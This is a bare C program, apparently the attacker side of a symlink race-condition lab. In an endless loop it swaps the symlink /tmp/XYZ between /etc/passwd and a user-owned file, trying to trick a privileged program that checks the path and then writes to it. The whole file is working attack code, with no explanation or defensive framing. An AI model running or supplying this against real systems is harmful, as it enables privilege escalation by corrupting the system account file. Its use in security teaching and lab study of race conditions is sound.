#include <stdio.h>
#include <sys/syscall.h>
#include <linux/fs.h>
#include<unistd.h>
int main()
{
 while(1){
	unlink("/tmp/XYZ");
	symlink("/etc/passwd", "/tmp/XYZ");
	usleep(10000);
	
	unlink("/tmp/XYZ");
	symlink("/tmp/myfile", "/tmp/XYZ");
	usleep(10000);
 }
}
